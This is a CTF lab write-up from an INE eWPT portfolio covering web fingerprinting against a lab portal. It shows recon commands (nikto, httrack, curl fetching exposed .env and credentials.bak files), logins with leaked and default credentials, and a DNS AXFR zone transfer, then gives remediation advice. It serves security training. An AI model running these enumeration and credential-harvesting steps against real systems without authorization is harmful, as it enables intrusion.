<div align="center">
  <a href="../README.md">⬅️ <b>Back to Section Hub</b></a> | <a href="../../README.md">📂 <b>eWPT Track Hub</b></a> | <a href="../../../README.md">🏠 <b>Portfolio Root</b></a>
</div>

<br>

<div align="center">
  <h1>🌐 Web Application Penetration Testing — Web Fingerprinting & Enumeration CTF 1 🌐</h1>
  <p><b>Platform:</b> INE Security | <b>Learning Path:</b> Web Application Penetration Tester (eWPT) | <b>Course:</b> Web Application Penetration Testing | <b>Difficulty:</b> Medium</p>
  <p><i>Date Completed: 05 November 2026</i></p>

[![Platform - INE](https://img.shields.io/badge/Platform-INE%20Security-0078D4?style=flat-square&logo=target)](https://ine.com/)
[![Track - eWPT](https://img.shields.io/badge/Track-eWPT-blueviolet?style=flat-square&logo=hackthebox)](../../README.md)
[![Flags - 8/8](https://img.shields.io/badge/Flags%20Captured-8%20%2F%208%20(100%25)-success?style=flat-square&logo=checkmarx)](./README.md)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-T1596%20%7C%20T1083%20%7C%20T1552.001%20%7C%20T1078%20%7C%20T1590.002-red?style=flat-square)](https://attack.mitre.org/)
[![OWASP Top 10](https://img.shields.io/badge/OWASP-A01%20%7C%20A05%20%7C%20A07-orange?style=flat-square)](https://owasp.org/Top10/)
[![CVSS v3.1](https://img.shields.io/badge/Max%20Severity-9.8%20(Critical)-critical?style=flat-square)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
</div>

---

## 📋 Objective & Scope
> **Execute comprehensive web application reconnaissance, fingerprinting, content discovery, and infrastructure enumeration against the target enterprise portal (`NovaCMS v2.8.4` hosted at `http://target.ine.local`). The assessment requires uncovering crawler directive disclosures, extracting build tokens from sitemaps, locating leftover debugging and system diagnostics files (`phpinfo.php`), brute-forcing unlinked administrative staff directories to recover backup credentials, performing offline recursive asset analysis via website mirroring, exploiting multiple credential disclosure vectors (`.bak` files and production `.env` files) to compromise user sessions, bypassing administrative controls via default credential identification, and performing an unauthorized DNS zone transfer (AXFR) to dump internal network architecture records and retrieve all 8 challenge flags.**

- **Target Host:** `target.ine.local` (`192.52.8.3`)
- **Audited Service:** HTTP (TCP Port 80), DNS (TCP/UDP Port 53)
- **Technology Stack:** NovaCMS v2.8.4, Python 3.10.20 / Werkzeug 3.1.8, Apache/2.4.41 (Ubuntu), PHP/7.4.33, MySQL 3306, BIND DNS Daemon
- **Attacker Host (`root@INE`):** Kali Linux
- **Primary Tooling:** `curl`, `nikto`, `httrack`, `dig`, `find`, `grep`, `Mozilla Firefox`

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20124954.png" alt="INE Web Fingerprinting and Enumeration CTF 1 lab dashboard showing briefing and tasks" width="850px">
  <br><i>Figure 1: INE Challenge Briefing — Skill Check Lab interface and task structure (Tasks 1–6).</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20125215.png" alt="INE Web Fingerprinting and Enumeration CTF 1 lab dashboard showing tasks 4 through 8" width="850px">
  <br><i>Figure 2: INE Challenge Briefing — Target specifications, flag submission formatting, and Tasks 4–8.</i>
</div>

<br>

---

## 🏁 Flag Capture Matrix (8 / 8 Flags Solved)

| Task | Objective Description | Attack Vector / Methodology | Artifact / Source Location | Captured Flag Value |
| :---: | :--- | :--- | :--- | :--- |
| **Task 1** | Inspect a well-known search-engine file for hidden notes | Robots.txt & Sitemap Reconnaissance | `target.ine.local/sitemap.xml` comment | `FLAG1_ef57cd89835d48239e220689716f94d5` |
| **Task 2** | Locate a leftover file that exposes detailed server information | Web Server Vulnerability Scanning (Nikto) | `target.ine.local/phpinfo.php` HTML debug comment | `FLAG2_1cd673f8e84b4298b6f5d142ca50518a` |
| **Task 3** | Discover an unlinked directory through brute-forcing | Directory Indexing & File Disclosure | `target.ine.local/staff/notes.txt` | `FLAG3_82cf35de3b454877a6ca1a51e59f8b11` |
| **Task 4** | Search the site's linked assets for developer comments | Full Site Offline Mirroring (`httrack`) & Grep | `~/novatech-mirror/.../analytics.js` build token | `FLAG4_927de4c8b3704caaa35cbafccb78ec4c` |
| **Task 5** | Authenticate with credentials recovered earlier and explore dashboard | Credential Replay / User Portal Authentication | Sarah Chen Dashboard (`/dashboard`) | `FLAG5_5a62f5e868f14eba8dee0532b1a43b82` |
| **Task 6** | Recover plaintext credentials from an exposed configuration file | Environment File Disclosure (`.env`) & Developer Login | Mike Torres Dashboard (`/dashboard`) | `FLAG6_5a75da50cfd746a686960da55d209253` |
| **Task 7** | Identify factory-default credentials by reading the page source | Default Admin Credential Identification (`admin:admin`) | NovaCMS Admin Dashboard (`/admin/dashboard`) | `FLAG7_d9f17e8bbd234684aacd32901a73f6b8` |
| **Task 8** | Pull a complete DNS zone from a misconfigured internal service | Unrestricted DNS Zone Transfer (`dig AXFR`) | DNS TXT Record (`_secret.novatech.local`) | `FLAG8_e809cea8e3474d7099575eb36ddd61b8` |

<br>

---

## 🛠️ Tools Used
| Tool | Purpose in Assessment |
| :--- | :--- |
| **curl** | Command-line HTTP utility used to fetch headers, query `/robots.txt`, extract debug comments from `/phpinfo.php`, inspect `/staff/`, and download `/.env`. |
| **Nikto v2.5.0** | Automated web server vulnerability scanner used to fingerprint backend servers, HTTP banners, security headers, unlinked paths, and dangerous files. |
| **HTTrack Website Copier** | Offline web crawler utilized to mirror the complete application directory tree and static client-side JavaScript assets into the local Kali filesystem. |
| **find & grep** | Linux command-line text processing utilities leveraged to search recursive JavaScript bundles for sensitive keywords, TODO notes, and build tokens. |
| **Firefox & DevTools** | Graphical web browser used for manual endpoint verification, portal authentication, session navigation, and DOM inspection. |
| **DiG (Domain Information Groper)** | DNS lookup utility used to resolve target nameserver IPs, query SOA/NS records, and exploit misconfigured DNS zone transfers (`AXFR`). |

<br>

---

## 🗺️ MITRE ATT&CK® Enterprise Mapping
| Tactic | ID & Sub-technique | Technique Name | Exploitation Context |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | [T1596](https://attack.mitre.org/techniques/T1596/) | Search Open Technical Databases | Extracting search crawler rules and XML sitemaps exposing internal application architecture. |
| **Reconnaissance** | [T1592.002](https://attack.mitre.org/techniques/T1592/002/) | Gather Victim Host Info: Software Discovery | Inspecting HTTP response headers (`Server`, `X-Powered-By`, `X-Backend-Server`, `X-App-Version`) via Nikto. |
| **Discovery** | [T1083](https://attack.mitre.org/techniques/T1083/) | File and Directory Discovery | Brute-forcing unlinked endpoints (`/staff/`, `/.env`, `/phpinfo.php`) and directory listing indexes. |
| **Discovery** | [T1590.002](https://attack.mitre.org/techniques/T1590/002/) | Gather Victim Network Info: DNS | Querying target nameserver on port 53 and executing full AXFR zone transfer to enumerate subdomains. |
| **Credential Access** | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Credentials In Files | Recovering plaintext staff passwords from `credentials.bak` and developer passwords from production `/.env`. |
| **Credential Access** | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Password Guessing / Default Credentials | Leveraging factory-default administrative credentials (`admin:admin`) on NovaCMS portal. |
| **Initial Access** | [T1078.003](https://attack.mitre.org/techniques/T1078/003/) | Valid Accounts: Local Accounts | Authenticating as user `sarah`, user `mike`, and privileged account `admin`. |
| **Collection** | [T1005](https://attack.mitre.org/techniques/T1005/) | Data from Local System | Scraping sensitive build tokens from client-side JavaScript assets mirrored via HTTrack. |

<br>

---

## 🔬 Vulnerability Analysis & CVSS v3.1 Scoring

### 1. Hardcoded Credentials & Production Environment File Disclosure (`.env`)
- **Vulnerability Type:** CWE-200 (Exposure of Sensitive Information) / CWE-522 (Insufficiently Protected Credentials)
- **OWASP Category:** [A05:2021 — Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- **WSTG Reference:** [WSTG-CONF-04 (Review Old, Backup and Unreferenced Files)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files)
- **CVSS v3.1 Score:** **7.5 (High)** — [`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
- **Root Cause:** The web root exposed an unencrypted, world-readable environment file (`/.env`) containing production database credentials (`nova_app:Pr0dDB_s3cur3!`), internal mail servers, and developer portal login accounts (`mike:m1k3_dev_2024`).

### 2. Factory-Default Administrative Credentials (`admin:admin`)
- **Vulnerability Type:** CWE-1188 (Insecure Default Initialization of Resource) / CWE-521 (Weak Password Requirements)
- **OWASP Category:** [A07:2021 — Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- **WSTG Reference:** [WSTG-ATHN-02 (Testing for Default Credentials)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Testing_for_Default_Credentials)
- **CVSS v3.1 Score:** **9.8 (Critical)** — [`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Root Cause:** The management interface permitted administrative logins utilizing factory-default credentials (`admin:admin`) without prompting for mandatory credential rotation, allowing trivial initial compromise and administrative privilege acquisition.

### 3. Misconfigured Unauthenticated DNS Zone Transfer (AXFR)
- **Vulnerability Type:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
- **OWASP Category:** [A05:2021 — Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- **WSTG Reference:** [WSTG-INFO-04 (Enumerate Applications on Webserver)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver)
- **CVSS v3.1 Score:** **5.3 (Medium)** — [`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
- **Root Cause:** The internal DNS server (`192.52.8.3`) accepted AXFR zone transfer requests from unauthenticated, arbitrary clients on the network, dumping internal subdomains, private IPs (`10.10.10.0/24`), staging/dev endpoints, and embedded confidential TXT records.

<br>

---

## ⚔️ Step-by-Step Exploitation Walkthrough

```text
+----------------------------------------------------------------------------------------------------+
|                                    ATTACK EXECUTION TIMELINE                                       |
+----------------------------------------------------------------------------------------------------+
  [Phase 1] Web Application Footprinting & Sitemap Inspection  --->  FLAG 1 Captured
  [Phase 2] Automated Vulnerability Scanning & phpinfo() Audit --->  FLAG 2 Captured
  [Phase 3] Directory Brute-Forcing & Staff Backup Extraction  --->  FLAG 3 Captured + Sarah Creds
  [Phase 4] Offline Web Mirroring & Static JS Asset Analysis   --->  FLAG 4 Captured
  [Phase 5] User Authentication & Dashboard Verification       --->  FLAG 5 Captured (Sarah)
  [Phase 6] Environment Configuration Disclosure (/.env)       --->  FLAG 6 Captured (Mike)
  [Phase 7] Factory-Default Administrative Login Bypass        --->  FLAG 7 Captured (Admin)
  [Phase 8] DNS Infrastructure Recon & AXFR Zone Transfer      --->  FLAG 8 Captured
+----------------------------------------------------------------------------------------------------+
```

### Phase 1: Web Application Footprinting & Sitemap Inspection (Task 1)

1. Initial browsing of `http://target.ine.local` identified a corporate landing page for **NovaTech Solutions - Cloud-Native Security Platform**.

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20125453.png" alt="NovaTech Cloud Security Platform homepage" width="850px">
  <br><i>Figure 3: Target web application homepage at target.ine.local.</i>
</div>

<br>

2. Standard web reconnaissance began by inspecting crawler directive files:
```bash
curl -s http://target.ine.local/robots.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20125607.png" alt="robots.txt file contents showing sitemap link and disallowed directories" width="750px">
  <br><i>Figure 4: robots.txt output disclosing /admin/, /staff/, /api/v2/, /.env, and /sitemap.xml.</i>
</div>

<br>

```text
User-agent: *
Disallow: /admin/
Disallow: /staff/
Disallow: /api/v2/
Disallow: /.env
Disallow: /server-status

Sitemap: http://target.ine.local/sitemap.xml
```

3. Navigating to `http://target.ine.local/sitemap.xml` revealed an XML document containing an embedded developer build comment:

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20125653.png" alt="sitemap.xml source code disclosing FLAG1 build reference" width="850px">
  <br><i>Figure 5: sitemap.xml revealing NovaCMS Sitemap Generator v2.8.4 and FLAG 1.</i>
</div>

<br>

```xml
<!-- NovaCMS Sitemap Generator v2.8.4 -->
<!--
Build ref: FLAG1_ef57cd89835d48239e220689716f94d5
-->
<urlset>
  <url><loc>http://target.ine.local/</loc><lastmod>2025-01-15</lastmod></url>
  <url><loc>http://target.ine.local/about</loc><lastmod>2025-01-10</lastmod></url>
  ...
```

> 🎯 **Flag 1 Captured:** `ef57cd89835d48239e220689716f94d5`

<br>

---

### Phase 2: Automated Vulnerability Scanning & phpinfo() Audit (Task 2)

1. An automated scan was performed against the web server utilizing **Nikto**:
```bash
nikto -h http://target.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20125938.png" alt="Nikto scan terminal output against target.ine.local" width="850px">
  <br><i>Figure 6: Nikto web vulnerability scan results identifying server headers, phpinfo.php, and /staff/.</i>
</div>

<br>

**Key Vulnerabilities & Fingerprinting Details Identified:**
- **Target IP:** `192.52.8.3` (Port 80)
- **Backend Headers:** `x-backend-server: web01.novatech.internal`, `x-app-version: NovaCMS/2.8.4`, `x-powered-by: PHP/7.4.33`
- **Interesting Endpoints:** `+ /phpinfo.php`, `+ /staff/: Directory indexing found`, `+ /.env`, `+ /#wp-config.php#`

2. Inspecting the discovered `/phpinfo.php` diagnostics script via `curl`:
```bash
curl -s http://target.ine.local/phpinfo.php | grep -i -C 3 'FLAG2'
```

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20130247.png" alt="curl command extracting FLAG 2 from phpinfo.php" width="850px">
  <br><i>Figure 7: Server provisioning token containing FLAG 2 recovered from phpinfo.php source comments.</i>
</div>

<br>

```html
<html><head><title>phpinfo()</title></head>
<body style="background:#0b0d14;color:#d1d5db;font-family:monospace;padding:40px;">
<!-- DEBUG: server provisioning token = FLAG2_1cd673f8e84b4298b6f5d142ca50518a -->
<!-- TODO: Remove this page before production deployment! -->
<h1 style="color:#ef4444;">PHP Version 7.4.33</h1>
<table style="border-collapse:collapse;width:100%;max-width:700px;margin-top:20px;">
```

> 🎯 **Flag 2 Captured:** `1cd673f8e84b4298b6f5d142ca50518a`

<br>

---

### Phase 3: Directory Brute-Forcing & Staff Backup Extraction (Task 3)

1. Reviewing the `/staff/` directory identified by Nikto:
```bash
curl -i http://target.ine.local/staff/
```

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20130456.png" alt="curl output showing /staff/ directory index" width="850px">
  <br><i>Figure 8: Apache open directory indexing listing credentials.bak and notes.txt.</i>
</div>

<br>

The directory listing exposed two unreferenced files:
- `notes.txt`
- `credentials.bak`

2. Downloading and inspecting `notes.txt`:
```bash
curl -s http://target.ine.local/staff/notes.txt
```

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20130623.png" alt="curl command dumping notes.txt and credentials.bak" width="850px">
  <br><i>Figure 9: Extraction of FLAG 3 from notes.txt and plaintext staff credentials from credentials.bak.</i>
</div>

<br>

```text
FLAG3_82cf35de3b454877a6ca1a51e59f8b11

# Internal note: Check credentials.bak in this directory for portal access.
```

> 🎯 **Flag 3 Captured:** `82cf35de3b454877a6ca1a51e59f8b11`

3. Downloading and inspecting `credentials.bak`:
```bash
curl -s http://target.ine.local/staff/credentials.bak
```

```text
# NovaTech Staff Credentials Backup
# Generated: 2024-11-20
# Author: it-ops@novatech.local
#
# Portal Credentials:
# Username: sarah
# Password: N0v@T3ch2025
#
# NOTE: Standard user access only.
# For admin access contact sysadmin.
```

Plaintext credentials recovered: **`sarah` : `N0v@T3ch2025`**.

<br>

---

### Phase 4: Offline Web Mirroring & Static JS Asset Analysis (Task 4)

1. To thoroughly audit all linked client-side scripts, stylesheets, and assets for hidden comments, **HTTrack** was used to create an offline mirror:
```bash
httrack http://target.ine.local -O ~/novatech-mirror
```

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20130946.png" alt="HTTrack mirroring target.ine.local locally" width="850px">
  <br><i>Figure 10: HTTrack crawling and mirroring target.ine.local into ~/novatech-mirror.</i>
</div>

<br>

2. Searching the mirrored `.js` assets for developer comments and flag markers using `find` and `grep`:
```bash
find ~/novatech-mirror -type f -name '*.js' -exec grep -inE 'FLAG4_|TODO|FIXME|secret|admin' {} +
```

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20131040.png" alt="find and grep command identifying FLAG 4 in javascript files" width="850px">
  <br><i>Figure 11: Grep search isolating FLAG 4 inside static JavaScript build configuration comments.</i>
</div>

<br>

```text
4:// Build configuration token: FLAG4_927de4c8b3704caaa35cbafccb78ec4c
```

> 🎯 **Flag 4 Captured:** `927de4c8b3704caaa35cbafccb78ec4c`

<br>

---

### Phase 5: User Authentication & Dashboard Verification (Task 5)

1. Navigating to the management portal at `http://target.ine.local/login`:

<div align="center">
  <img src="./images/Screenshot%2020026-11-05%20125453.png" alt="NovaTech sign in page with sarah credentials entered" width="850px">
  <br><i>Figure 12: Authenticating with recovered staff credentials (sarah / N0v@T3ch2025).</i>
</div>

<br>

2. Upon submitting the credentials, the portal authenticated the session and redirected to `http://target.ine.local/dashboard`:

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20131511.png" alt="Sarah Chen dashboard displaying FLAG 5 security token" width="850px">
  <br><i>Figure 13: Sarah Chen user dashboard displaying active session and FLAG 5 security token.</i>
</div>

<br>

- **Authenticated User:** Sarah Chen (`sarah.chen@novatech.local`)
- **Role:** User
- **Security Token Banner:** `FLAG5_5a62f5e868f14eba8dee0532b1a43b82`

> 🎯 **Flag 5 Captured:** `5a62f5e868f14eba8dee0532b1a43b82`

<br>

---

### Phase 6: Environment Configuration Disclosure (`.env`) (Task 6)

1. Recalling the `/.env` path uncovered in `robots.txt` and verified by Nikto, `curl` was used to fetch the file:
```bash
curl -i http://target.ine.local/.env
```

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20131939.png" alt="curl output showing contents of .env file" width="850px">
  <br><i>Figure 14: Exposed .env file leaking database credentials and temporary developer login credentials.</i>
</div>

<br>

```text
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.10.20
Date: Thu, 05 Nov 2026 07:49:15 GMT
Content-Type: text/plain
Content-Length: 330
Connection: close

# NovaTech Environment Config
APP_NAME=NovaCMS
APP_ENV=production
APP_DEBUG=false
DB_HOST=localhost
DB_PORT=3306
DB_DATABASE=novatech_prod
DB_USERNAME=nova_app
DB_PASSWORD=Pr0dDB_s3cur3!
MAIL_HOST=smtp.novatech.internal
MAIL_PORT=587

# Dev portal access (temporary - remove after sprint)
# DEV_USER=mike
# DEV_PASS=m1k3_dev_2024
```

2. Navigating back to `http://target.ine.local/login` and submitting developer credentials **`mike` : `m1k3_dev_2024`**:

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20132212.png" alt="NovaTech sign in page with mike credentials entered" width="850px">
  <br><i>Figure 15: Submitting developer portal credentials for mike.</i>
</div>

<br>

3. Accessing the authenticated dashboard for Mike Torres:

<div align="center">
  <img src="./images/Screenshot%20200265-11-05%20125453.png" alt="Mike Torres dashboard displaying FLAG 6 security token" width="850px">
  <br><i>Figure 16: Mike Torres developer dashboard displaying FLAG 6 security token.</i>
</div>

<br>

- **Authenticated User:** Mike Torres (`mike.torres@novatech.local`)
- **Role:** User
- **Security Token Banner:** `FLAG6_5a75da50cfd746a686960da55d209253`

> 🎯 **Flag 6 Captured:** `5a75da50cfd746a686960da55d209253`

<br>

---

### Phase 7: Factory-Default Administrative Login Bypass (Task 7)

1. Reviewing the NovaCMS application documentation and default credential lists indicated that the default superuser credentials for newly deployed instances are **`admin` : `admin`**.
2. Submitting `admin` credentials on `http://target.ine.local/login`:

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20132731.png" alt="NovaTech sign in page with admin credentials entered" width="850px">
  <br><i>Figure 17: Entering factory-default administrator credentials (admin / admin).</i>
</div>

<br>

3. The login was accepted, routing directly to the privileged endpoint `http://target.ine.local/admin/dashboard`:

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20132805.png" alt="NovaTech Admin Dashboard displaying FLAG 7 admin token" width="850px">
  <br><i>Figure 18: NovaCMS Admin Dashboard displaying system telemetry and privileged FLAG 7 admin token.</i>
</div>

<br>

- **User Identity:** `admin@novatech.local` (Role: `admin`)
- **System Metrics:** Users: 3, Sessions: 1, System: Healthy, Alerts: 5
- **Admin Token Banner:** `FLAG7_d9f17e8bbd234684aacd32901a73f6b8`

> 🎯 **Flag 7 Captured:** `d9f17e8bbd234684aacd32901a73f6b8`

<br>

---

### Phase 8: DNS Infrastructure Recon & AXFR Zone Transfer (Task 8)

1. Checking initial DNS resolution:
```bash
dig NS target.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20133150.png" alt="dig NS target.ine.local command output" width="850px">
  <br><i>Figure 19: Initial dig NS query against local forwarder (127.0.0.11#53) returning SERVFAIL for mDNS domain.</i>
</div>

<br>

2. Querying host record directly:
```bash
dig target.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20133229.png" alt="dig target.ine.local resolving to 192.52.8.3" width="850px">
  <br><i>Figure 20: dig query resolving target.ine.local to target IP 192.52.8.3.</i>
</div>

<br>

3. Inspecting the container's resolver configuration:
```bash
cat /etc/resolv.conf
```

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20133306.png" alt="cat /etc/resolv.conf output" width="850px">
  <br><i>Figure 21: Resolv.conf file indicating Docker Engine internal resolver.</i>
</div>

<br>

4. Querying the target machine's DNS daemon directly on `192.52.8.3:53` for SOA and NS records:
```bash
dig @192.52.8.3 target.ine.local SOA
dig @192.52.8.3 target.ine.local NS
```

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20133358.png" alt="dig query for SOA record against 192.52.8.3" width="850px">
  <br><i>Figure 22: Direct SOA query against target DNS server at 192.52.8.3.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20133506.png" alt="dig query for NS record against 192.52.8.3" width="850px">
  <br><i>Figure 23: Direct NS query against target DNS server at 192.52.8.3.</i>
</div>

<br>

5. Attempting an unrestricted DNS Zone Transfer (**AXFR**) against the nameserver:
```bash
dig @192.52.8.3 axfr target.ine.local
```

<div align="center">
  <img src="./images/Screenshot%202026-11-05%20133532.png" alt="Full DNS zone transfer axfr output revealing internal architecture and FLAG 8" width="850px">
  <br><i>Figure 24: Successful AXFR DNS zone transfer dumping full internal zone and secret TXT record with FLAG 8.</i>
</div>

<br>

```text
; <<>> DiG 9.19.25-185-g392e7199df2-1-Debian <<>> @192.52.8.3 axfr target.ine.local
; (1 server found)
;; global options: +cmd
novatech.local.         300     IN      SOA     ns1.novatech.local. admin.novatech.local. 2025011501 3600 600 604800 300
novatech.local.         300     IN      NS      ns1.novatech.local.
novatech.local.         300     IN      NS      ns2.novatech.local.
novatech.local.         300     IN      A       10.10.10.10
ns1.novatech.local.     300     IN      A       10.10.10.10
ns2.novatech.local.     300     IN      A       10.10.10.11
www.novatech.local.     300     IN      A       10.10.10.10
mail.novatech.local.    300     IN      A       10.10.10.12
novatech.local.         300     IN      MX      10 mail.novatech.local.
app.novatech.local.     300     IN      A       10.10.10.10
api.novatech.local.     300     IN      A       10.10.10.13
blog.novatech.local.    300     IN      CNAME   www.novatech.local.
staging.novatech.local. 300     IN      A       10.10.10.20
dev.novatech.local.     300     IN      A       10.10.10.21
jenkins.novatech.local. 300     IN      A       10.10.10.30
gitlab.novatech.local.  300     IN      A       10.10.10.31
db.novatech.local.      300     IN      A       10.10.10.50
vpn.novatech.local.     300     IN      A       10.10.10.40
novatech.local.         300     IN      TXT     "v=spf1 mx a ip4:10.10.10.0/24 ~all"
_secret.novatech.local. 300     IN      TXT     "FLAG8_e809cea8e3474d7099575eb36ddd61b8"
novatech.local.         300     IN      SOA     ns1.novatech.local. admin.novatech.local. 2025011501 3600 600 604800 300
;; Query time: 2 msec
;; SERVER: 192.52.8.3#53(192.52.8.3) (TCP)
;; WHEN: Thu Nov 05 13:31:35 IST 2026
;; XFR size: 21 records (messages 1, bytes 557)
```

The zone transfer exfiltrated the entire internal subnet topology (`10.10.10.0/24`), revealing internal hosts (`jenkins`, `gitlab`, `vpn`, `db`), mail exchangers, and a confidential TXT record on `_secret.novatech.local`.

> 🎯 **Flag 8 Captured:** `e809cea8e3474d7099575eb36ddd61b8`

<br>

---

## 🛡️ Key Takeaways & Defensive Remediation

### 1. Disable Apache Directory Indexing & Remove Sensitive File Extensions
- **Remediation:** Disable directory browsing globally in Apache by configuring `Options -Indexes` across `/etc/apache2/apache2.conf` and virtual host definitions.
- **File Blacklisting:** Configure web server request-filtering rules to deny access to backup, swap, and sensitive configuration extensions (`.env`, `.bak`, `.old`, `.swp`, `~`).

```apache
<Directory /var/www/html>
    Options -Indexes -FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>

# Block access to dot-files and backup extensions
<FilesMatch "^\.env|\.(bak|config|sql|ini|log|sh)$">
    Require all denied
</FilesMatch>
```

### 2. Purge Diagnostics & Debug Artifacts Before Deployment
- **Remediation:** Remove `phpinfo.php`, development stubs, and testing scripts prior to production promotion.
- **Asset Scrubbing:** Ensure CI/CD build pipelines execute automated linters that strip developer comments, internal build reference tokens (`Build ref:`), and sensitive metadata from production JavaScript and XML sitemaps.

### 3. Enforce Strict Password Policies & Mandatory Initial Rotation
- **Remediation:** Remove factory-default credentials (`admin:admin`). Force administrators to establish strong, unique passwords upon initial portal setup.
- **Account Lockouts:** Implement rate-limiting and progressive account lockouts on `/login` to thwart automated credential stuffing and brute-force attempts.

### 4. Secure DNS Zone Transfers (AXFR Restriction)
- **Remediation:** Configure DNS daemons (such as BIND9) to restrict zone transfers (`allow-transfer`) exclusively to authorized secondary slave nameservers using Transaction Signatures (TSIG) keys:

```named
zone "novatech.local" {
    type master;
    file "/etc/bind/zones/db.novatech.local";
    allow-transfer { 10.10.10.11; key TRANSFER-KEY; };
};
```

---

<div align="center">
  <i>Part of the INE Web Application Penetration Tester (eWPT) Certification Lab Portfolio. Documented by Amar P.</i>
</div>
